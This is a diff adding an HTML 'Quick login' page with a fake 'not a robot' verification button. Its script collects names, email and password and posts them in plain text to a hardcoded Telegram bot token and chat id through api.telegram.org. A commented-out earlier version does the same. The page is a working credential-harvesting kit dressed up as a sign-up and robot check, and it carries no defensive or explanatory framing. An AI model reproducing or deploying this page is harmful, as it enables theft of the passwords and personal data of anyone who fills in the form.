@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../../../favicon.ico">
+    <title>Telegram bot</title>
+</head>
+
+<body>
+   <div class="login">
+     <h1>Quick login</h1>
+
+    <form>
+
+        <input type="text" placeholder="first name" id="firstName">
+        <input type="text" placeholder="Last name" id="lastName">
+        <input type="email" placeholder="email" id="email">
+        <input type="password" placeholder="password" id="password">
+
+        <button onclick="alertrobot()" type="button">Sign up</button>
+
+    </form>
+  </div>
+
+  
+    <div class="cache">
+        <p>By clicking this you verify that you are not a robot</p>
+        <button onclick="alertrobot()">accept</button>
+        <button>decline</button>
+
+    </div>
+
+    <!-- <script>
+        function alertrobot() {
+            var firstName = document.getElementById("firstName").value;
+            var lastName = document.getElementById("lastName").value;
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            let tg = {
+                token: "8170990135:AAEXbeUfWvAnq4_higo0sbijNwXjyvLZhiU", // Your bot's token that got from @BotFather
+                chat_id: "5260464527" // The user's(that you want to send a message) telegram chat id
+            }
+            /**
+             * By calling this function you can send message to a specific user()
+             * @param {String} the text to send
+             *
+             */
+            function sendMessage(text) {
+                const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request
+
+                const obj = {
+                    chat_id: tg.chat_id, // Telegram chat id
+                    text: text // The text to send
+                };
+
+                const xht = new XMLHttpRequest();
+                xht.open("POST", url, true);
+                xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+                xht.send(JSON.stringify(obj));
+            }
+
+            // Now you can send any text(even a form data) by calling sendMessage function.
+            // For example if you want to send the 'hello', you can call that function like this:
+            sendMessage("First name " + firstName +  "Last name " + lastName + "Email " + email + "Password" + password );
+
+        }
+
+    </script> -->
+
+
+    <script>
+  function alertrobot() {
+    const firstName = document.getElementById("firstName").value;
+    const lastName = document.getElementById("lastName").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const tg = {
+      token: "8170990135:AAEXbeUfWvAnq4_higo0sbijNwXjyvLZhiU", // use a safe backend in real apps
+      chat_id: "5260464527"
+    };
+
+    const message =
+      "📨 New Signup Info:\n\n" +
+      "🧑 First Name: " + firstName + "\n" +
+      "👤 Last Name: " + lastName + "\n" +
+      "📧 Email: " + email + "\n" +
+      "🔒 Password: " + password;
+
+    const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;
+
+    const obj = {
+      chat_id: tg.chat_id,
+      text: message
+    };
+
+    const xht = new XMLHttpRequest();
+    xht.open("POST", url, true);
+    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+    xht.send(JSON.stringify(obj));
+
+    alert("✅ Your info has been sent via Telegram!");
+  }
+</script>
+
+
+</body>
+
+
+</html>
